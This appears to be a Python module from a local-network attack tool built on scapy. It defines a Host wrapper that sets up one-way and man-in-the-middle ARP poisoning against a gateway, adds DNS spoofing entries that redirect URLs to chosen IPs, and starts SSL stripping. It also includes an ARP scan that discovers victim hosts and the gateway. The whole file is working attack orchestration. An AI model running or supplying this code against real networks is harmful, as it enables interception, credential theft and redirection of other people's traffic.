from scapy.all import *

from arp_poisoning import ArpPoisoner
from dns_poisoning import DnsPoisoner
from ssl_stripping import SslRemover


class Host():

    def __init__(self, ip, mac, interface, dns_queue_num):

        self.ip             = ip
        self.mac            = mac
        self.arp_poisoner   = ArpPoisoner(interface)
        self.arp_attack     = None
        self.arp_active     = False
        self.dns_poisoner   = DnsPoisoner(ip, dns_queue_num)
        self.ssl_remover    = SslRemover(ip, dns_queue_num + 1)
        self.seen_this_scan = True

    # prepares one-way arp poisoning attack, telling this host that "other_ip" is at "other_mac"
    def arp_oneway(self, other_ip, other_mac):
        
        # remove existing packets before preparing new attack
        self.arp_poisoner.clear_packets()
        self.arp_poisoner.add_packet(other_mac, self.mac, other_ip, self.ip)
        self.arp_attack = "oneway"

    # prepares mitm arp poisoning attack, telling this host that "gateway_ip" is at "other_ip" and telling the gateway that "self.ip" is at "other_mac"
    def arp_mitm(self, gateway_ip, gateway_mac, other_mac):

        # remove existing packets before preparing new attack
        self.arp_poisoner.clear_packets()
        self.arp_poisoner.add_packet(other_mac, self.mac, gateway_ip, self.ip)
        self.arp_poisoner.add_packet(other_mac, gateway_mac, self.ip, gateway_ip)
        self.arp_attack = "mitm"

    # starts currently prepared arp poisoning attack
    def arp_start(self):

        self.arp_poisoner.start()
        self.arp_active = True

    # stops currently running arp poisoning attack
    def arp_stop(self):

        self.arp_poisoner.stop()
        self.arp_active = False

    def dns_add(self, url, ip):

        self.dns_poisoner.add_url(url, ip)

    def dns_start(self):

        self.dns_poisoner.start()

    def dns_stop(self):

        self.dns_poisoner.stop()

    def remove(self):

        self.arp_poisoner.stop()
        self.dns_poisoner.stop()

# scan on specified range and interface, return found gateway and hosts
def get_hosts(interface, range_, timeout, gateway, hosts):

    known_ips = []

    for host in [gateway] + hosts:
        
        try:
            known_ips.append(host.ip)
            host.seen_this_scan = False

        except AttributeError as _:
            pass

    # if ip range is specified using netmask, convert to cidr
    if range_.count('.') > 4:
        range_ = range_.split('/')
        range_[1] = str(sum([str(bin(int(x))).count("1") for x in range_[1].split('.')])) # this atrocious line just converts to binary and counts the number of ones
        range_ = '/'.join(range_).encode("ascii")

    # arp query on specified range
    packet  = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=range_)

    # send the packet and store replies
    results = srp(packet, timeout=timeout, iface=interface, verbose=1)[0]
    replies = [result.answer[ARP] for result in results]

    for reply in replies:

        if reply.psrc in known_ips:
            
            for host in [gateway] + hosts:
            
                if host.ip == reply.psrc:
                    host.seen_this_scan = True
        
        else:

            # store ip ending in ".1" as gateway
            if reply.psrc[-2:] == ".1":
                gateway = Host(reply.psrc, reply.hwsrc, interface, 0)

            # store other ip's in the list of hosts
            else:
                hosts.append(Host(reply.psrc, reply.hwsrc, interface, 2*(len(hosts) + 1) ))

    gateway = gateway if gateway.seen_this_scan else None
    hosts   = [host for host in hosts if host.seen_this_scan]

    return gateway, hosts
